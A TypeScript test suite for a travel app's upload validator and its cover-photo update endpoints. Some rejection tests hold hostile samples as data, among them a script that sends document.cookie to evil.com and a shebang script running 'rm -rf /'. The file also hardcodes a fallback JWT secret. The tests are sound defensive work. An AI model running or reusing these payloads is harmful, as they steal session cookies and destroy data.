/**
 * TripMate: Upload Content & Signature Validation Security Test Suite
 *
 * Verifies:
 * 1. Legitimate JPEG images pass.
 * 2. Legitimate JPEG images with embedded XMP metadata containing "xmlns:svg" pass (Root Cause Fix).
 * 3. Legitimate PNG images pass.
 * 4. Legitimate WebP images pass.
 * 5. Legitimate PDF documents pass.
 * 6. Legitimate GIF images pass.
 * 7. SVG files (raw <svg>) are strictly rejected.
 * 8. SVG files with XML declarations (<?xml ... ?><svg>) are strictly rejected.
 * 9. SVG files with XML comments (<!-- ... --><svg>) are strictly rejected.
 * 10. SVG disguised with .jpg extension and image/jpeg MIME type are rejected.
 * 11. HTML documents (<!doctype html>, <html>) are strictly rejected.
 * 12. Script tags (<script>) are strictly rejected.
 * 13. Executable DOS/Windows binaries (MZ) are strictly rejected.
 * 14. Executable Linux binaries (ELF) are strictly rejected.
 * 15. Shebang scripts (#!) are strictly rejected.
 * 16. Extension/content signature mismatches (PDF named .jpg, PNG named .jpg, JPEG named .pdf) are rejected.
 * 17. MIME type and extension mismatches are rejected.
 * 18. Empty files are rejected.
 * 19. Trip cover photo update, retrieval (persistence), and preset selection with isolated MongoDB.
 */

import express from 'express';
import http from 'http';
import jwt from 'jsonwebtoken';
import mongoose from 'mongoose';
import { MongoMemoryServer } from 'mongodb-memory-server';
import { User, Trip, TripMember, UploadedAsset } from '../models';
import { validateFileBufferContent } from '../routes/uploadRoutes';
import tripRoutes from '../routes/tripRoutes';
import uploadRoutes from '../routes/uploadRoutes';

const JWT_SECRET = process.env.JWT_SECRET || 'tripmate_super_secret_jwt_key_2026';

let passed = 0;
let failed = 0;

function assert(condition: boolean, msg: string) {
  if (condition) {
    console.log(`  ✓ PASS: ${msg}`);
    passed++;
  } else {
    console.error(`  ✗ FAIL: ${msg}`);
    failed++;
  }
}

async function run() {
  console.log('\n======================================================');
  console.log('TripMate: Upload Content & Security Validation Tests');
  console.log('======================================================\n');

  // --------------------------------------------------------------------------
  // PART 1: Buffer Content & Magic Byte Signature Unit Checks
  // --------------------------------------------------------------------------
  console.log('--- PART 1: Signature & Payload Content Checks ---');

  // 1. Authentic JPEG image
  const legitimateJpeg = Buffer.from([
    0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01
  ]);
  const resJpeg = validateFileBufferContent(legitimateJpeg, 'image/jpeg', 'vacation.jpg');
  assert(resJpeg.valid, 'Authentic JPEG image is accepted');

  // 2. Authentic JPEG image with XMP metadata containing "xmlns:svg=" (THE BUG!)
  const xmpPayload =
    '<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description rdf:about="" xmlns:svg="http://www.w3.org/2000/svg" xmlns:photoshop="http://ns.adobe.com/photoshop/1.0/"><photoshop:SidecarForExtension>svg</photoshop:SidecarForExtension></rdf:Description></rdf:RDF></x:xmpmeta><?xpacket end="w"?>';
  const xmpBuffer = Buffer.from(xmpPayload, 'utf-8');
  const jpegWithXmp = Buffer.concat([
    Buffer.from([0xff, 0xd8, 0xff, 0xe1, (xmpBuffer.length + 2) >> 8, (xmpBuffer.length + 2) & 0xff]),
    xmpBuffer,
    Buffer.from([0xff, 0xdb, 0x00, 0x43, 0x00, 0x01, 0x02, 0x03])
  ]);
  const resJpegXmp = validateFileBufferContent(jpegWithXmp, 'image/jpeg', 'camera_cover.jpg');
  assert(
    resJpegXmp.valid,
    'Authentic JPEG containing XMP metadata with "xmlns:svg" is accepted (Root Cause Fix)'
  );

  // 3. Authentic PNG image
  const legitimatePng = Buffer.from([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52
  ]);
  const resPng = validateFileBufferContent(legitimatePng, 'image/png', 'group_photo.png');
  assert(resPng.valid, 'Authentic PNG image is accepted');

  // 4. Authentic WebP image
  const legitimateWebP = Buffer.concat([
    Buffer.from('RIFF', 'ascii'),
    Buffer.from([0x24, 0x00, 0x00, 0x00]), // 36 bytes length
    Buffer.from('WEBPVP8 ', 'ascii'),
    Buffer.from([0x18, 0x00, 0x00, 0x00]), // frame length
    Buffer.from([0x30, 0x01, 0x00, 0x9d, 0x01, 0x2a, 0x10, 0x00, 0x10, 0x00])
  ]);
  const resWebP = validateFileBufferContent(legitimateWebP, 'image/webp', 'landscape.webp');
  assert(resWebP.valid, 'Authentic WebP image is accepted');

  // 5. Authentic PDF document
  const legitimatePdf = Buffer.from('%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n');
  const resPdf = validateFileBufferContent(legitimatePdf, 'application/pdf', 'ticket.pdf');
  assert(resPdf.valid, 'Authentic PDF document is accepted');

  // 6. Authentic GIF image
  const legitimateGif = Buffer.from('GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;');
  const resGif = validateFileBufferContent(legitimateGif, 'image/gif', 'anim.gif');
  assert(resGif.valid, 'Authentic GIF image is accepted');

  // 7. Pure SVG Document
  const pureSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="40"/></svg>');
  const resPureSvg = validateFileBufferContent(pureSvg, 'image/svg+xml', 'icon.svg');
  assert(
    !resPureSvg.valid && Boolean(resPureSvg.reason?.includes('HTML, SVG, and script payloads are strictly prohibited')),
    'Pure SVG document is strictly rejected'
  );

  // 8. SVG disguised as JPG (XML declaration + <svg>)
  const disguisedSvg = Buffer.from('<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg"><script>alert("pwn")</script></svg>');
  const resDisguisedSvg = validateFileBufferContent(disguisedSvg, 'image/jpeg', 'cover.jpg');
  assert(
    !resDisguisedSvg.valid && Boolean(resDisguisedSvg.reason?.includes('HTML, SVG, and script payloads are strictly prohibited')),
    'Disguised SVG disguised as JPG is strictly rejected'
  );

  // 9. SVG with XML comments before <svg>
  const commentedSvg = Buffer.from('<!-- Vector asset generated by tool -->\n  <svg width="200" height="200"></svg>');
  const resCommentedSvg = validateFileBufferContent(commentedSvg, 'image/jpeg', 'fake.jpg');
  assert(
    !resCommentedSvg.valid && Boolean(resCommentedSvg.reason?.includes('HTML, SVG, and script payloads are strictly prohibited')),
    'SVG with comments is strictly rejected'
  );

  // 10. HTML document disguised as PNG
  const disguisedHtml = Buffer.from('<!DOCTYPE html><html><head><title>Test</title></head><body><h1>Hello</h1></body></html>');
  const resHtml = validateFileBufferContent(disguisedHtml, 'image/png', 'banner.png');
  assert(
    !resHtml.valid && Boolean(resHtml.reason?.includes('HTML, SVG, and script payloads are strictly prohibited')),
    'HTML document disguised as PNG is strictly rejected'
  );

  // 11. Script tag injection in buffer
  const scriptPayload = Buffer.from('<script type="text/javascript">fetch("http://evil.com?c="+document.cookie)</script>');
  const resScript = validateFileBufferContent(scriptPayload, 'image/jpeg', 'photo.jpg');
  assert(
    !resScript.valid && Boolean(resScript.reason?.includes('HTML, SVG, and script payloads are strictly prohibited')),
    'Script payload is strictly rejected'
  );

  // 12. Executable Windows PE (MZ)
  const exeBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
  const resExe = validateFileBufferContent(exeBuffer, 'image/jpeg', 'payload.jpg');
  assert(
    !resExe.valid && Boolean(resExe.reason?.includes('Executable files (MZ/PE) are strictly prohibited')),
    'Executable MZ binary is strictly rejected'
  );

  // 13. Executable Linux ELF
  const elfBuffer = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
  const resElf = validateFileBufferContent(elfBuffer, 'image/png', 'rootkit.png');
  assert(
    !resElf.valid && Boolean(resElf.reason?.includes('Executable binaries (ELF) are strictly prohibited')),
    'Executable ELF binary is strictly rejected'
  );

  // 14. Shebang script
  const shebangBuffer = Buffer.from('#!/bin/bash\nrm -rf /\n');
  const resShebang = validateFileBufferContent(shebangBuffer, 'text/plain', 'script.txt');
  assert(
    !resShebang.valid && Boolean(resShebang.reason?.includes('Executable script files (shebang #!) are strictly prohibited')),
    'Shebang script is strictly rejected'
  );

  // 15. Extension / Signature mismatch: PDF content in file named .jpg
  const mismatchPdfAsJpg = validateFileBufferContent(legitimatePdf, 'image/jpeg', 'avatar.jpg');
  assert(
    !mismatchPdfAsJpg.valid && Boolean(mismatchPdfAsJpg.reason?.includes('JPEG image signature')),
    'PDF content named as .jpg is rejected'
  );

  // 16. Extension / Signature mismatch: PNG content in file named .jpg
  const mismatchPngAsJpg = validateFileBufferContent(legitimatePng, 'image/jpeg', 'avatar.jpg');
  assert(
    !mismatchPngAsJpg.valid && Boolean(mismatchPngAsJpg.reason?.includes('JPEG image signature')),
    'PNG content named as .jpg is rejected'
  );

  // 17. Extension / Signature mismatch: JPEG content in file named .pdf
  const mismatchJpegAsPdf = validateFileBufferContent(legitimateJpeg, 'application/pdf', 'document.pdf');
  assert(
    !mismatchJpegAsPdf.valid && Boolean(mismatchJpegAsPdf.reason?.includes('PDF document signature')),
    'JPEG content named as .pdf is rejected'
  );

  // 18. MIME / Extension mismatch: JPEG content, named .jpg, but MIME is image/png
  const mismatchMime = validateFileBufferContent(legitimateJpeg, 'image/png', 'photo.jpg');
  assert(
    !mismatchMime.valid && Boolean(mismatchMime.reason?.includes('mismatch')),
    'Mismatched MIME type and extension is rejected'
  );

  // 19. Empty file buffer
  const emptyRes = validateFileBufferContent(Buffer.alloc(0), 'image/jpeg', 'empty.jpg');
  assert(
    !emptyRes.valid && Boolean(emptyRes.reason?.includes('empty')),
    'Empty buffer is rejected'
  );

  // --------------------------------------------------------------------------
  // PART 2: Database & Trip Cover Photo Persistence Integration Test
  // --------------------------------------------------------------------------
  console.log('\n--- PART 2: Group Cover Photo Persistence Integration ---');

  const mongod = await MongoMemoryServer.create();
  await mongoose.connect(mongod.getUri());

  const app = express();
  app.use(express.json());
  app.use('/api/trips', tripRoutes);
  app.use('/api/upload', uploadRoutes);

  const server = http.createServer(app);
  let serverPort = 0;
  await new Promise<void>((resolve) => {
    server.listen(0, () => {
      serverPort = (server.address() as any).port;
      resolve();
    });
  });

  const baseUrl = `http://localhost:${serverPort}`;

  // Create test user and trip
  const adminUser = await User.create({
    name: 'Cover Admin',
    email: 'coveradmin@example.com',
    passwordHash: 'hash'
  });
  const adminToken = jwt.sign({ userId: adminUser._id, email: adminUser.email }, JWT_SECRET);

  const memberUser = await User.create({
    name: 'Normal Member',
    email: 'member@example.com',
    passwordHash: 'hash'
  });
  const memberToken = jwt.sign({ userId: memberUser._id, email: memberUser.email }, JWT_SECRET);

  const testTrip = await Trip.create({
    name: 'Goa Holiday Group',
    destination: 'Goa',
    startDate: new Date(),
    endDate: new Date(Date.now() + 86400000 * 5),
    createdBy: adminUser._id,
    status: 'ACTIVE',
    coverImage: 'https://images.unsplash.com/photo-initial-cover'
  });

  await TripMember.create({ tripId: testTrip._id, userId: adminUser._id, role: 'ADMIN' });
  await TripMember.create({ tripId: testTrip._id, userId: memberUser._id, role: 'MEMBER' });

  // 20. Member cannot edit group cover photo (Unauthorized check)
  const unauthRes = await fetch(`${baseUrl}/api/trips/${testTrip._id}`, {
    method: 'PATCH',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${memberToken}`
    },
    body: JSON.stringify({
      coverImage: 'https://images.unsplash.com/photo-hacked'
    })
  });
  assert(unauthRes.status === 403, 'Normal member cannot update group cover photo (HTTP 403)');

  // 21. Track an asset for admin to verify asset ownership verification
  const newAssetPublicId = 'trips/new_group_cover_123';
  await UploadedAsset.create({
    publicId: newAssetPublicId,
    uploadedBy: adminUser._id,
    folder: 'trips',
    originalName: 'cover.jpg',
    resourceType: 'image'
  });

  // 22. Admin updates group cover photo with newly uploaded image
  const updateRes = await fetch(`${baseUrl}/api/trips/${testTrip._id}`, {
    method: 'PATCH',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${adminToken}`
    },
    body: JSON.stringify({
      name: 'Goa Holiday Group Updated',
      destination: 'South Goa',
      coverImage: 'https://res.cloudinary.com/tripmate/image/upload/v12345/trips/new_group_cover_123.jpg',
      coverImagePublicId: newAssetPublicId,
      description: 'Updated group trip description'
    })
  });
  const updateData = await updateRes.json();
  assert(
    updateRes.status === 200 &&
    updateData.trip.coverImage === 'https://res.cloudinary.com/tripmate/image/upload/v12345/trips/new_group_cover_123.jpg' &&
    updateData.trip.coverImagePublicId === newAssetPublicId,
    'Admin successfully updates group cover photo URL and publicId'
  );

  // 23. Verify persistence on subsequent fetch (simulates page refresh)
  const refreshRes = await fetch(`${baseUrl}/api/trips/${testTrip._id}`, {
    headers: { Authorization: `Bearer ${adminToken}` }
  });
  const refreshData = await refreshRes.json();
  assert(
    refreshRes.status === 200 &&
    refreshData.trip.coverImage === 'https://res.cloudinary.com/tripmate/image/upload/v12345/trips/new_group_cover_123.jpg' &&
    refreshData.trip.name === 'Goa Holiday Group Updated',
    'Group cover photo and name persist correctly after page refresh / re-fetch'
  );

  // 24. Admin switches to preset cover image
  const presetRes = await fetch(`${baseUrl}/api/trips/${testTrip._id}`, {
    method: 'PATCH',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${adminToken}`
    },
    body: JSON.stringify({
      coverImage: 'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=800&q=80',
      coverImagePublicId: undefined
    })
  });
  const presetData = await presetRes.json();
  assert(
    presetRes.status === 200 &&
    presetData.trip.coverImage.includes('photo-1507525428034-b723cf961d3e'),
    'Admin can switch group cover photo to preset Unsplash image and it persists'
  );

  server.close();
  await mongoose.disconnect();
  await mongod.stop();

  console.log('\n======================================================');
  console.log(`Test Results: ${passed} passed, ${failed} failed`);
  console.log('======================================================\n');

  if (failed > 0) {
    process.exit(1);
  }
}

run().catch((err) => {
  console.error('Test execution failed:', err);
  process.exit(1);
});

